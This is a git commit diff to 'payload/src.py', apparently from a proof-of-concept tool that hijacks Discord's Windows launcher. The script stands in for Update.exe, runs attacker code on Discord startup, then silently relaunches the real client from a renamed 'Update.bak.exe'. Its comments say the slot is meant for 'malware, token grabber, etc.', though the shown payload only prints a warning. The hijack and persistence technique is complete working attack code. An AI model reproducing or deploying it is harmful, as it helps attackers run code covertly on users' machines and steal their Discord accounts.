b9df3f5bb9f77c02f7a1fe14d77a5bf427b89d5c
Moon <111264841+rodriguez-moon@users.noreply.github.com>
2022-10-06 23:29:33 -0600

    Improve payload efficiency
    Removed a lot of superfluous code by directly using the arguments provided by sys.argv.

--- payload/src.py
+++ payload/src.py
@@ -1,41 +1,29 @@
 # This is where the attacker would put any malicious code to be ran on Discord startup.
 # Ex: malware, token grabber, etc.
 
-import sys
-from ntpath import *
+from ntpath import exists
 from os import name
 from subprocess import run
+from sys import argv
 
 
-def run_discord(script: str) -> None:
-    # %localappdata%\Discord\Update.exe --processStart discord.exe
-    path = join(dirname(script), "Update.bak.exe")
-    if not exists(path):
-        raise SystemExit("Failed to find 'Update.bak.exe'.")
-    client = basename(dirname(script)).lower()
-
-    _CMD = [path, "--processStart", f"{client}.exe"]
-    print(f"Executing {' '.join(_CMD)}")
-    run(_CMD)
+def malicious_code() -> None:
+    print("Your Discord installation has been compromised!")
 
 
-def get_script_path() -> str:
-    # executable (Update.exe)
-    if getattr(sys, "frozen", False):
-        path = realpath(sys.executable)
-    # python script
-    elif __file__:
-        path = abspath(__file__)
-    else:
-        path = sys.argv[0]
-    return path
+def run_discord() -> int:
+    # %localappdata%\Discord\Update.bak.exe --processStart discord.exe
+    argv[0] = argv[0].replace("Update.exe", "Update.bak.exe")
+    if not exists(argv[0]):
+        raise SystemExit(0)
+    print(f"Executing {' '.join(argv)}")
+    return run(argv).returncode
 
 
 def main() -> None:
-    print("Your Discord installation has been compromised!")
-    script = get_script_path()
-    run_discord(script)
-    input()
+    malicious_code()
+    code = run_discord()
+    input(f"Completed with returncode {code}")
 
 
 if __name__ == "__main__" and name == "nt":
